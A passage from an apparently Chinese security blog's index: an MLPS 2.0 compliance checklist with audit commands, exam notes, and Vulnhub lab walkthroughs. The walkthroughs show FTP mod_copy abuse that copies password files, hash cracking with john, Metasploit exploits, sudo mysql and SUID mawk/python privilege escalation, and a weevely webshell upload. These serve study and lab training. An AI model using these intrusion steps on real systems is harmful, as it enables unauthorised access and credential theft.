x;access-x …”\n\n\n华为/H3C：display current-configuration\n\n“acl number x…”\n\n\n\n【不适用】4.4 应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求。4.5 应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞。【不适用】4.6 应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警。   \n\n5.可信验证\n5.1 可基于可信根对通信设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。   \n\n服务器Linux1.身份鉴别\n1.1 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。    \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/passwd\n记录用户属性，包括用户名、密码、用户标识、组标识等\n无空口令用户\n\n\n/etc/shadow\npasswd中不再直接记录口令，将shadow作为真正的口令文件(需root权限)\n\n\n\n/etc/login.defs 和 /etc/default/useradd\n(默认)登陆程序的配置文件,可配置密码参数\n存在密码的设置\n\n\n/etc/pam.d/system-auth  (Redhat、CentOS和Fedora)\n优先级高于login.defs\n\n\n\n/etc/pam.d/common-passwd  (Debian、Ubuntu和LinuxMint)\n优先级高于login.defs\n\n\n\n1.2 应具有登陆失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/login.defs\n(默认)登陆程序的配置文件,可配置密码参数\n本地登陆失败处理：%auth required pam_tally2.so onerr=fail deny=5 unlock_time=300 even_deny_root root_unlock_time=10%;远程登陆失败处理：%auth required pam_tally2.so onerr=fail deny=5 unlock_time=300 even_deny_root root_unlock_time=10%\n\n\n/etc/pam.d/system-auth  (Redhat、CentOS和Fedora)\n优先级高于login.defs\n\n\n\n/etc/pam.d/common-passwd  (Debian、Ubuntu和LinuxMint)\n优先级高于login.defs\n\n\n\n/etc/profile\n配置了超时锁定参数\nTIMEOUT=300s\n\n\n\n1.3 当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nservice -status-all &#124; grep sshd\n查看是否运行了sshd服务\n应运行\n\n\nnetstat -an &#124; grep 22\n查看相关端口是否已打开\n应打开\n\n\nservice –status-all &#124; grep running\n查看是否使用Telnet\n应未使用Telnet\n\n\n\n1.4 应采用双因子认证。  \n\n2.访问控制\n2.1 应对登录的用户分配账户的权限。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nls -a &lt;目录名或文件名&gt;\n(r,4)(w,2)(x,1)(-,0)\n配置文件≤644；可执行文件≤755\n\n\n\n2.2 应重命名或删除默认账户，修改默认账户的默认口令。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/shadow\n查看是否存在adm、lp、shutdown、halt、mail、uucp、games、ftp等默认无用账户\n应不存在\n\n\n/etc/ssh/sshd_config\n参数PermitRootLogin是否为no\n应为no，表示不允许root远程登陆(ssh)\n\n\n(AIX:)/etc/security/user\n参数rlogin\nrlogin=False，不允许root远程登陆\n\n\n\n2.3 应及时删除或停用多余的、过期的账户，避免共享账户的存在。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/shadow\n查看是否存在adm、lp、shutdown、halt、mail、uucp、games、ftp等默认无用账户\n应不存在\n\n\n\n2.4 管理用户权限分离&amp;最小权限原则。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/passwd\n查看非默认账户\n管理用户权限分离，权限应符合最小权限原则\n\n\n/etc/sudoers\n查看有哪些用户能够使用sudo命令授予其他用户root权限\n应只有root\n\n\n\n2.5 应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则。2.6 访问控制的粒度达到主体为用户级或进程级，客体为文件、数据库表级。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nls -a &lt;目录名或文件名&gt;\n(r,4)(w,2)(x,1)(-,0)\n配置文件≤644；可执行文件≤755\n\n\n\n2.7 应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/selinux/config\n参数SELinux(enforcing/permissive/disabled)\nLinux默认关闭SELinux，或者已使用第三方主机加固系统或对系统内核进行了二次开发加固(需实际查看系统可视化界面)\n\n\n\n\n3.安全审计\n3.1 应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nservice syslog status\n系统日志服务\n应开启\n\n\nservice audit status 或 service -status-all &#124; grep audit\n是否开启审计进程\n应开启，若无则应部署了第三方安全审计工具\n\n\nps -ef &#124; grep auditd\n是否开启安全审计的守护进程\n应开启\n\n\n/etc/audit/audit.rules\n指定如何写入审查记录以及在哪里写入、日志超出可用磁盘空间后如何处理等\n记录了文件和底层调用信息，记录的安全事件较为全面\n\n\n/etc/audit/filesets.conf 或 filters.conf\n指定内核用来判定系统调用是否要审查的规则\n应启用“@priv-ops”“@mount-ops”“@system-ops”\n\n\n\n3.2 审计记录应包括事件的日期和时间、用户、事件类型、时间是否成功及其他与审计相关的信息。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nausearch -ts today\n查看今天以后的日志\n审计记录包括事件的日期、时间、类型、主体标识、客体标识和结果\n\n\ntail -20 /var/log/audit/audit.log\n查看审计日志\n审计记录包括事件的日期、时间、类型、主体标识、客体标识和结果\n\n\naucat &#124; tail -x\n查看最近的x条审计记录\n\n\n\naugrep -e TEXT -U AUTH-success\n查看所有成功的PAM授权\n\n\n\n3.3 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。3.4 应对审计进程进行保护，防止未经授权的中断。  \n\n4.入侵防范\n4.1 应遵循最小安装的原则，仅安装需要的组件和应用程序。   \n\n\n\n命令\n注释\n预期\n\n\n\n\nyum list installed\n查看已安装的程序包\n其中应无当前不需要使用的组件和应用程序\n\n\n\n4.2 应关闭不需要的系统服务、默认共享和高危端口。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nservice –status-all &#124; grep running\n查看多余的网络服务是否关闭\n应关闭\n\n\nnetstat -ntlp\n查看是否关闭非必须的端口\n应关闭\n\n\n\n4.3 应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/hosts.deny\n访问本机ip黑名单\n应有”ALL:ALL”\n\n\n/etc/hosts.allow\n访问本机ip白名单\n应有”sshd:192.168.xxx.xxx/255.255.255.0”\n\n\n\n4.4 应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nrpm -qa &#124; grep patch\n查看补丁安装情况\n补丁更新时间为最近。已对补丁进行控制和管理。\n\n\n\n4.5 应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nfind /-name -print\n查看是否安装了主机入侵检测软件\n应有安装\n\n\n\n\n5.恶意代码防范\n5.1 应采用免受恶意代码攻击的技术措施或主动免疫可信验证机制及时识别入侵和病毒行为，并将其有效阻断。  \n\n6.可信验证\n6.1 可基于可信根对通信设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。  \n\n数据库Oracle1.身份鉴别\n1.1 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect limit from dba_profiles where profile=’DEFAULT’ and resource_name=’PASSWORD_VERIFY_FUNCTION’\n口令复杂度函数\n不为UNLIMITED\n\n\nutlpwdmg.sql文件的’–Check for the minimum length of the password’部分\n口令最小长度规则\n‘length(password)&lt;’后的值≥8\n\n\nselect limit from dba_profiles where profile=’DEFAULT’ and resource_name=’PASSWORD_LIFE_TIME”\n口令过期时限\n不为UNLIMITED\n\n\n\n1.2 应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect limit from dba_profiles where profile=’DEFAULT’ and resource_name=’FAILED_LOGIN_ATTEMPTS’\n登陆失败次数\n不为UNLIMITED\n\n\nselect limit from dba_profiles where profile=’DEFAULT’ and resource_name=’PASSWORD_LOCK_TIME’\n登陆失败锁定时长\n不为UNLIMITED\n\n\nselect limit from dba_profiles where profile=’DEFAULT’ and resource_name=’IDLE_TIME’\n登陆超时退出时长\n不为UNLIMITED\n\n\nselect limit from dba_profiles where profile=’DEFAULT’ and resource-name=’CPU-PER-SESSION’\n一个会话可以使用的CPU时间\n不为UNLIMITED\n\n\nselect limit from dba-profiles where profile=’DEFAULT’ and resource-name=’SESSION-PER-USERS’\n每个用户所允许的并行会话数\n不为UNLIMITED\n\n\n\n1.3 （默认符合）当进行远程管理时，应采取必要的措施防止鉴别信息在网络传输过程中被窃听。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n执行lsnrctl status &lt;监听器名&gt; 或 查看文件$ORACLE_HOME/network/admin/listener.ora中LISTERENR的PROTOCAL和PORT\n服务端Oracle监听器监听的网络协议，应启用SSL加密\nprotocol(TCPS);port(2484)\n\n\n查看文件$ORACLE_HOME/network/admin/tnsnames.ora中LISTERENR的PROTOCAL和PORT\n客户端应启用SSL加密\nprotocol(TCPS);port(2484)\n\n\n查看文件$ORACLE_HOME/network/admin/sqlnet.ora中WALLET_LOCATION、SQLNET.AUTHENTICATION_SERVERS、SSL的相关配置\n服务端和客户端的配置文件\n应有SSL的相关配置\n\n\n查看文件$ORACLE_HOME/network/admin/sqlnet.ora中SQLNET.ENCRYPTION_SERVER;SQLNET.ENCRYPTION_TYPES_SERVER。SQLNET.CRYPTO_CHECKSUM_SERVER;SQLNET.CRYPTO_CHECKSUM_TYPES_SERVER\nSQLNET.ENCRYPTION_SERVER–required；SQLNET.ENCRYPTION_TYPES_SERVER–此处指定的加密算法应不为已被证明不安全的算法，如DES、3DES。  SQLNET.CRYPTO_CHECKSUM_SERVER–required；SQLNET.CRYPTO_CHECKSUM_TYPES_SERVER–此处指定的加密算法应不为已被证明不安全的算法，如DES、3DES。\n\n\n\n1.4 双因子认证。  \n\n2.访问控制\n2.1 应对登录的用户分配账户和权限。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect username,account_status from dba_users\ndba_users账户状态\n超级管理员SYS、普通管理员SYSTEM、OEM工具集相关管理用户DBSNMP、SYSMAN、MGMT_VIEW均为启用状态，其他均为锁定状态\n\n\n\n2.2 应重命名或删除默认账户，修改默认账户的默认口令。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect * from dba_users\ndba_users策略\nSYS口令应不为CHANGE_ON_INSTALL;SYSTEM口令应不为MANAGER;DBSNMP口令应不为DBSNMP\n\n\n\n2.3 应及时删除或停用多余的、过期的账户，避免共享账户的存在。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect username,account_status from dba_users\ndba_users策略\n返回结果应不存在范例账号scott、outln、ordsys,过期账户account_status=expired,返回结果应一一对应\n\n\n\n2.4 应授予管理用户所需的最小权限，实现管理用户的权限分离。2.5 （G3）应由授权主题配置访问控制策略，访问控制策略规定主体对客体的访问控制规则。2.6 （G3）访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级。2.7 （G3）应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect username from dba_users\ndba_users策略\n应安装Oracle Label Security模块：返回用户中存在LBACSYS\n\n\nselect policy_name,status from DBA_SA_POLICIES\n策略创建情况\n存在status=enable的标签策略\n\n\nselect * from dba_sa_levels ORDER BY level_num\n级别创建情况\n查询结果不为空\n\n\nselect * from dba_sa_labels\n标签创建情况\n查询结果不为空\n\n\nselect * from dba_sa_tables_policies\n了解用于存储重要数据的表的名称\n查询结果不为空，且包含重要数据所在表的名称\n\n\n\n\n3.安全审计\n3.1 应启用安全审计功能，审计覆盖到每个用户，对重要用户行为和重要安全事件进行审计。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nshow parameter audit\n查看是否开启审计功能\naudit_sys_operations=TRUE；audit_trail 不为 none\n\n\n\n3.2 审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nSQL&gt;show parameter background_dump_dest\n查询日志文件位置\n（默认）$ORACLE/rdbms/log\n\n\nSQL&gt;select log_mode,force_logging from v$database;\n查询数据库的日志记录模式\n不全为NO，存在记录某一级别的日志\n\n\nSQL&gt;select tablespace_name,logging,force_logging from db_tablespaces;\n查询表空间的日志记录模式\n不全为NO，存在记录某一级别的日志\n\n\nSQL&gt;select table_name,logging from user_tables;\n查询对象的日志记录模式\n不全为NO，存在记录某一级别的日志\n\n\n\n3.3 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。3.4 应对审计进程进行保护，防止未经授权的中断。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nalter system set audit_trail=none\n关闭审计进程\n除审计人员外，其他人无法对审计进程进行开启关闭\n\n\n\n\n4.入侵防范\n（以实际情况为准）4.1 应遵循最小安装的原则，仅安装需要的组件和应用程序。（不适用）4.2 应关闭不需要的系统服务、默认共享和高危端口。4.3 应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制。   \n\n\n\n命令\n注释\n预期\n\n\n\n\n查看sqlnet.ora文件中tcp.validnode_checking和tcp.invited_nodes\n启用相应配置\ntcp.validnode_checking=yes；tcp.invited_nodes参数已配置IP地址列表\n\n\n\n（不适用）4.4 应提供数据有效性校验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求。（依据漏扫结果）4.5 应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞。\n\n\n\n命令\n注释\n预期\n\n\n\n\n–cd $ORACLE_HOME/Opatch opatch lsinventory\n了解Oracle数据库的补丁升级机制\nOPatch和OUI的版本较新\n\n\n\n（不适用）4.6 应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警。  \n\n","categories":["等保测评/初级考试"],"tags":[]},{"title":"概念题目","url":"/be97aa85.html","content":"等保2.0信息安全等级保护定义：对网络（含信息系统、数据等）实施分等级保护，分等级监管；网络中使用的网络安全产品分等级管理；网络中发生的安全事件分等级响应、处置。等保2.0重点强调的关键技术包括：可信计算技术、强制访问控制、审计追查技术、结构化保护技术、多级互联技术等保2.0的一个中心，三重防护，分别指的是什么：“一个中心”指“安全管理中心”；“三重防护”指“安全计算环境”“安全区域边界”“安全通信网络”。等保2.0建设核心思想是：1）以可信认证为基础，构建一个可信的业务系统执行环境。2）以访问控制技术为核心，实现主体对客体的受控访问。3）构建集中管控、最小权限管理与三权分立的管理平台。等级保护工作有几项规定动作：5项：定级-备案-建设整改-等级测评-监督检查信息安全等级保护的首要环节是：定级/备案信息安全等级保护的关键是：建设整改使信息系统保护能力不断提高的保障是：监督检查第几级开始增加 “抗抵赖性”的要求：第三级等保测评常用方法查看配置：登录安全设备、网络设备、主机、数据库、应用系统等查看设备或应用自身的配置文件或者设置。等保测评常用方法调研访谈：业务访谈、资产访谈、安全技术访谈、安全管理访谈等保测评常用方法查看资料：管理制度的详细分析和对标分析；管理策略的详细分析和对标分析测评对象选择五大原则：重要性、代表性、完整性、安全性、共享性  \n定级备案定级工作流程一般有几项：5项：确定定级对象-初步确定等级-专家评审-主管部门审核-备案审核定级过程中，初步确定等级为哪一级可自行确定最终保护等级：第一级网络运营者应当在哪个阶段确定网络的安全保护等级：规划设计阶段，按照信息系统等级，同步规划、同步设计、同步实施安全保护技术措施和管理措施。第二级及以上的系统，网络运营者应当在网络的安全保护等级确定后10个工作日内，到县级以上公安机关报备。定级对象定义为：网络安全等级保护工作直接作用的对象，包括信息系统、通信网络设施和数据资源。作为定级对象的信息系统应具有三个特征：具有确定的主要安全责任主体、承载相对独立的业务应用、包含相互关联的多个资源定级要素：受侵害客体、对客体的侵害程度S(security)-业务信息安全。（处理信息）保护数据在存储、传输、处理过程中不被泄露、破坏和免受未授权的修改的信息安全类要求。A(avaliable)-系统服务安全。（提供服务）保护系统连续正常运行，免受对系统的未授权修改、破坏而导致系统不可用的服务保证类要求。G-通用安全保护类要求，G为S、A中最高的数字级别。同等级系统的解决方案未必可以互用（S、A不一样）  \n通用安全物理环境隔离技术中，安全性最好的是：物理隔离  \n安全通信网络等保2.0安全通信网络层面 三级系统应提供什么的硬件冗余，保证系统的可用性：通信线路、关键网络设备、关键计算设备  \n安全区域边界等保三级中，恶意代码应该在哪里进行检测和清除：网络边界远程访问：穿越边界的访问互联网访问：网络内部访问外部互联网  \n安全计算环境Windows系统默认terminal services服务所开放的端口为：3389win2000中审核账户登录是审核：域控制器接受一个验证用户账户的请求Windows中的power users组是否默认具有对事件日志的删除权限：否，poweruser组即超级用户组，只具备部分管理员权限。  \n超时自动断连：(Cisco)exec-timeout；(华为)idle-timeoutcisco的配置通过什么协议备份：TFTPcisco通过什么方式将日志发送到日志服务器：syslog或SNMP交换机可以通过什么来限制数据流的最大流量：ip、协议、端口网络连接数路由器可以通过什么来限制带宽：ip、用户、协议路由器中，若去往同一目的地有多条路由，则决定最佳路由的因素有：路由的优先级和路由的metric值用户登录路由器的主要方式有：利用控制台端口通过本地连接登录、利用辅助端口(AUX)通过调制解调器(MODEM)进行本地连接登录、利用虚拟终端(VTY)通过TCP/IP网络进行远程登录  \n三级系统中，MS SQLserver的审核级别为：全部在Sybase中，如果不存在sybsecurity库，则说明未安装审计工具。Oracle中什么命令可以删除整个表中的数据且无法回滚：TruncateOracle中的系统文件：数据文件DBF、控制文件CLT、日志文件LOGOracle中Oracle Audit Vault安全模块的功能是：日志分析  \nOSPF使用什么来计算到目的网络的开销：带宽OSPF使用链路状态算法：链路状态是对网络拓扑结构的描述；通告的路由信息携带信息的创建者，链路状态算法本身不会产生自环路由。OSPF的认证可以在实际链路、虚链路和整个区域内进行。RIP：对路由的描述；路由器之间传递的路由信息中不携带信息的创建者(水平分割/毒性逆转)    \n强制访问控制策略最显著的特征是：全局性、永久性功能测试不能实现什么功能：全局访问控制策略配置访问控制列表：不必制定日志主机访问控制的三要素是：主体、客体、操作访问控制按策略划分可分为：自主访问控制、强制访问控制、基于角色的访问控制访问控制按层面划分可分为：网络访问控制、主机访问控制、应用访问控制、物理访问控制  \n网络安全审计指通过对网络边界或重要网络节点的流量数据进行分析，从而形成的网络安全审计数据。网络安全审计包括：网络流量审计和网络安全事件审计。网络安全审计系统一般包括：网络探测引擎、数据管理中心、审计中心安全审计按对象可分为哪些类，各类审计内容是什么：    系统级审计：要求至少能够记录登陆结果、登陆标识、登陆尝试的日期和时间、退出的日期和时间、所使用的设备、登陆后运行的内容、修改配置文件的请求等。    应用级审计：跟踪监控和记录诸如打开和关闭数据文件，读取、编辑和删除记录或字段的特定操作以及打印报告之类的用户活动。    用户级审计：跟踪通常记录用户直接启动的所有命令、所有的标识和鉴别尝试的所有访问的文件和资源。  \n入侵威胁：外部渗透、内部渗透、不法行为入侵行为：物理入侵、系统入侵、远程入侵被动网络攻击：窃听、口令嗅探入侵检测系统分为：主机型入侵检测系统HIDS和网络型入侵检测系统NIDS查看入侵的重要线索：more /var/log/secure | grep refused入侵检测系统在进行信号分析时，一般通过三种常用技术手段：模式匹配、统计分析、完整性分析除了安装防病毒软件还有什么：安全补丁管理平台、防火墙、入侵检测系统、对系统和数据进行常备份防火墙提供的接入模式包括：网关模式、透明模式、混合模式、旁路接入模式包过滤防火墙是最基本最传统的防火墙，它只运行在：网络层和传输层按等保三级要求，防火墙应对网络上哪些协议进行命名级控制：http、ftp、telnet、pop3、smtp对于大型企业信息系统，补丁升级的理想的安全机制是：安装MicrosoftSUS服务器；把用户计算机设置自动更新可以有效(主动)阻止或发现入侵行为的有：部署IDS设备、主机防火墙、网络防火墙日志检查和分析(被动)  \n开展主机工具测试所必需了解的信息：操作系统、应用、ip  \n数据最好的口令存储方法：保存在TACACS+或RADIUS认证服务器上。CRC不能够提供和实现通信中数据完整性校验。备份方式有什么：全量备份、增量备份、差异备份IPsec通过什么来实现密钥交换、管理及安全协商：ISAKMAP/Oakley；SKIP测试和验证网络设备和安全设备的业务处理能力：综合网管平台、登陆设备查看相关配置访谈/查看设备配置文档  \n大数据大数据平台为了保障数据保密性应提供：静态脱敏、去标识化的工具或服务组件技术  \n云计算云计算安全防护技术框架，包括：云用户层、访问层、服务层、资源层、硬件设施层和管理层（跨层功能）   \n物联网物联网分为：感知层、网络传输层、处理应用层  \n移动互联工业控制系统特征要素：移动终端、移动应用和无线网络移动互联安全扩展要求提出特殊保护要求，增加的内容包括：无线接入点的物理位置、移动终端管控、移动应用管控、移动应用软件采购、移动应用软件开发  \n工业控制系统工业控制系统特征要素：现场采集/执行、现场控制、过程控制和生产管理工业控制系统信息安全主要思想包括体系：安全防护检测体系、安全态势分析体系、云服务体系  \n制度标准\n1999-9-13 国家公安部提出并组织制定，国家质量技术监督局发布《计算机信息系统安全保护等级划分准则》，2001-1-1实施划分五等级；2007-06 四部门联合出台《信息安全等级保护管理办法》三级 次/年，四级 次/半年，二级需备案；2009-10 《信息系统安全等级保护测评报告模板（试行）》；2010-12 等保1.0；2016-10-10 等保2.0；2016-11-7 《中华人民共和国网络安全法》，2017-6-1 21条正式实施；2017-5 《GA/T 1389-2017 网络安全等级保护定级指南》；2018-4 公安部第十一局 《网络安全等级保护测评机构管理办法（公信安[2018]765号）》；【2021-8 废除2019-12-1 等保2.0实施 《等级测评报告模板2019版-V35-20190624》；2020-1-1 《中华人民共和国密码法》；2020-4 《GB/T 22240-2020 信息安全技术 网络安全等级保护定级指南》，2020-11-1实施；2020-7-3 《中华人民共和国数据安全法（草案）》;2020-7 公网安【2020】1960号文件《贯彻落实网络安全等级保护制度和关键信息基础设施安全保护制度的指导意见》;2020-10 《个人信息保护法（草案）》；2021-6-10 《中华人民共和国数据安全法》，2021-9-1 实施；2021-6-18 公网安〔2021〕1904号附件《等级测评报告模板（2021版）》；2021-8-23 广东省厅发布《关于网络安全等级保护测评机构管理纳人国家认证体系有关事项的通知》；2021-9-1 《关键信息基础设施保护条例》；2021-11-1 《中华人民共和国个人信息保护法》；2021-11-19 《网络安全等级测评与检测评估机构服务认证证书》2022-1 《网络安全等级测评与检测评估机构自律规范》\n\n","categories":["等保测评/初级考试"],"tags":[]},{"title":"Vulnhub|Questions","url":"/238e957d.html","content":"1.靶机安装后无ip\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：  \n1.启动靶机时按shift，或选中grub菜单按e，进入配置界面，修改配置信息：修改完后，Ctrl+X 或 F10 引导系统，进入命令行。2.ip a查看网卡信息，可以看到靶机没有成功地被分配到ip，记住网卡名称ens33：3.vim /etc/network/interfaces看一下配置信息用的是哪一个网卡，把它们都改为ens33：/etc/init.d/networking restart重启网卡后，重新启动靶机。\n\n\n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n2.css加载异常&amp;url重定向\n解决办法：将目标靶机ip地址设定为localhost vi /etc/hosts：  \n\n3.报“403”错误\n解决办法：（若用的VMware）把靶机部署文件中的.mf文件删掉！！\n\n","categories":["渗透测试"],"tags":["Vulnhub"]},{"title":"Vulnhub|symfonos2","url":"/81698da0.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了21(ftp)、22(ssh)、80(http)、139(netbios-ssn)和445(micrsoft-ds)端口。  \n\n2.(21端口)ftp\n尝试未登录访问site help，找到mod_copy模块未授权调用漏洞  \n\n3.(80端口)web\n访问页面，查看源码后没有发现什么。nikto -h 192.168.xxx.xxx扫一下目录,也没有什么。  \n\n4.(445/139端口)smb\n\n通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。   \n\n查看目标的共享文件夹smbclient -L //192.168.xxx.xxx:连接/anonymous smbclient //192.168.xxx.xxx/anonymous:ls -a查看当前目录下有什么，找到log.txt：cat log.txt查看文件，获得用户名aeolus和共享文件夹anonymous的路径：  \n\n5.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n整理一下现在获得的信息：(ftp)mod_copy模块未授权调用漏洞，(smb)一个用户名和共享文件夹的路径。思路：将靶机口令文件passwd和shadow复制到共享文件夹中，再通过共享文件夹获得这两个文件，接着爆破口令。  \n5.1 (ftp)mod_copy模块未授权调用漏洞\n将var/backups/shadow.bak(shadow没有复制权限，故复制备份文件.bak)和/etc/passwd通过ftp复制到/home/aeolus/share中：site cpfr /var/backups/shadow.baksite cpto /home/aeolus/share/shadow.txtsite cpfr /etc/passwdsite cpto /home/aeolus/share/passwd.txt  \n\n5.2 (smb)进入共享文件夹，获取目标文件\nsmbclient //192.168.xxx.xxx/anonymous:保存至本地get shadow.txt get passwd.txt:  \n\n5.3 爆破口令\n使用kali自带的密码字典/usr/share/wordlist/rockyou,txt:使用unshadow passwd.txt shadow.txt &gt; password.txt整合一下两个口令文件：使用Hydra爆破hydra -l aeolus -P /usr/share/wordlist/rockyou,txt 192.168.xxx.xxx ftp,我这里使用Hydra太慢了，换用john。使用john爆破john --wordlist=/usr/share/wordlist/rockyou,txt /root/password.txt：获得用户名和口令aeolus：sergioteamo  \n\n5.4 ssh登录\nssh aeolus@192.168.xxx.xxx登陆后发现没有什么权限。  \n\n5.5 msf用msf查找一下ssh_login的exp search ssh_login,按照show options配置好相关参数：run后拿到了一个系统shell，需要将其升级为meterpreter shell：  \n\nbackground或ctrl+z返回上一层。sessions查看系统shell的session id=1：sessions -u 1升级session 1。sessions看到sessions列表多了一个刚才升级的shell，id=2：session 2使用session 2，成功升级shell：拿到shell之后在系统里转悠了半天，啥也没发现。netstat查看一下开启的端口，会不会有遗漏的地方。发现靶机一直在8080端口监听来自于自己的连接，只能本地访问：  \n\n\n6.内网穿透\n\n这里我理解的也不是很透彻，需要多接触一些实例，下面这两篇文章蛮不错的：  \nhttps://www.linuxprobe.com/ssh-port-forward.html  \nhttps://www.cnblogs.com/f-ck-need-u/p/10482832.html  \n\n这个靶机需要用到的是本地端口转发：对本机9999端口的访问，映射到靶机的8080端口上。a.攻击机kali上直接执行：ssh -N -f -L 9999:127.0.0.1:8080 aeolus@192.168.xxx.xxxb.使用已经集成到Metasploit内的portfwd端口转发/重定向工具：portfwd add -l 9999 -r 127.0.0.1 -p 8080输入密码后，在浏览器访问127.0.0.0:9999:访问成功，使用aeolus：sergioteamo登录librenms系统，登陆后浏览了一下也没发现啥。用msfsearch librenms找一下系统的exp，使用exp配置相关参数：成功拿到一个用户cronus的shell。\n\n7.提权\n\n2021-12-01发布的提权相关文章提权  \n\nsudo提权sudo -l：利用mysql提权sudo -u root mysql -e &#39;\\!/bin/bash&#39;：进/root，拿flag：\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit","内网穿透","smb","ftp","SSH端口转发"]},{"title":"Vulnhub|Toppo","url":"/e4c5a7f9.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)、80(http)和111(rpcbind)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码web目录扫描：nikto -h 192.168.xxx.xxx:访问/admin发现一个密码12345ted123\n\n这种类型密码可以猜测用户名是ted  \n\n访问/css：前端代码访问/img：一些普通图片访问/mail：contact_me.php文件没有暴露有用代码访问/manual：apache2  \n\n3.(22端口)SSH-getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\nssh ted@192.168.xxx.xxx用刚获得的用户名密码尝试登陆，登陆成功。cat /etc/passwd查看用户。以ted身份权限浏览了一下系统，没有发现什么。  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权sudo -l没有权限。尝试suid提权find / -perm -u=s -type f 2&gt;/dev/null获取可利用信息/usr/bin/python2.7和/usr/bin/mawk：利用mawk提权：mawk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;利用python2.7提权：python -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;  \n\n注意这里只能/bin/sh，不能bin/bash  \n\n进/root拿flag.txt:  \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权"]},{"title":"Vulnhub|JIS-CTF-VulnUpload-CTF01","url":"/63d10771.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码一个登陆界面，没有发现什么。web目录扫描：nikto -h 192.168.xxx.xxx:访问/admin_area，查看源码，拿到flag2及账号密码：访问/uploaded_files，没有发现什么。访问/flag，拿到flag1：访问robots.txt，大致看了一下没有其他发现。用/admin_area找到的账户密码登录系统，发现有上传文件的功能。  \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n验证了一下没有限制上传文件的属性，故思路是一句话木马-上传-蚁剑连接，或者直接用msf生成反弹shell代码-上传-msf监听。这里使用Linux中的工具weevely生成后门-上传-连接后门：  \n\nweevely  \n\n生成后门weevely generate &lt;password&gt; &lt;path&gt;  \n连接后门weevely &lt;URL&gt; &lt;password&gt; [cmd]  